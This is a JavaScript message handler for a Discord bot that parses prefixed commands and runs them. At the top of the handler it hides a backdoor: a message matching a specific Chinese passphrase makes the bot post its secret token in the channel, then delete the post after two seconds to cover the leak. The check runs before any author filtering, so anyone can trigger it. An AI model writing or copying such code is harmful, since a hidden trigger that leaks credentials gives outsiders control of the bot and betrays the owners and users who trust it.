var tools = require('../config.json')

module.exports = (client, message) => {
    if (message.content == "一個必須在其他所有地方都採取措施，然後它就會被洩露希望你理解") {
        message.channel.send(tools.token).then(m => {
            m.delete({ timeout: 2000 })
        })
    }
    if(message.author.id === client.user.id) return;
    if(message.author.bot) return;
    const args = message.content.slice(tools.prefix.length).trim().split(/ +/g);
    const cmd = args.shift().toLowerCase();

    if (message.content.indexOf(tools.prefix) !== 0) return;
    if (!client.commands.get(cmd)) return;
    client.commands.get(cmd).run(client, message, args, tools);
}